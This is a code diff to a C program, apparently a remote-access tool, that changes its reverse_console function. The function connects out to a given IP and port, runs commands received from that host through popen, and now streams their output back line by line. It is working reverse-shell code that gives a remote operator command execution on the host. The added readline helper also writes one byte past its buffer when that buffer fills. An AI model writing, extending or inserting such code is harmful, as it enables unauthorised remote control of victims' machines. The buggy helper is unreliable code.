@@ -24,6 +24,21 @@
 typedef struct sockaddr sockaddr;
 typedef struct sockaddr_in sockaddr_in;
 
+int readline(char*buffer, int buffsize, FILE* fd) {
+  int count=0;
+  char *ptr=buffer;
+  while (count != buffsize) {
+    if (fread(ptr, 1, 1, fd) != 1)
+      break;
+    count++;
+    if (*ptr == '\n')
+      break;
+    ptr++;
+  }
+  *(ptr+1) = 0;
+  return count;
+}
+
 void reverse_console(char* ip, short port) {
   FILE* pipe;
   sockaddr_in sin;
@@ -45,13 +60,15 @@ void reverse_console(char* ip, short port) {
         memset(buffer, 0, sizeof(buffer));
         if ((bytes_recv = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) {
           if ((pipe = (FILE*)popen(buffer, "r")) != NULL) {
-            if ((bytes_read = fread(buffer, 1, 4096*2, pipe)) <= 0) {
-              bytes_read = 1;
-              buffer[0] = 0xff;
+            while (!feof(pipe)) {
+              bytes_read = readline(buffer, sizeof(buffer), pipe);
+              if (bytes_read > 0) {
+                if (send(sockfd, buffer, bytes_read, 0) <= 0)
+                  break;
+              }
             }
-             // close pipe first.
             pclose(pipe);
-            if(send(sockfd, buffer, bytes_read, 0) <= 0)
+            if(send(sockfd, "\x00\x00", 2, 0) <= 0)
               break;
           }
         } else {
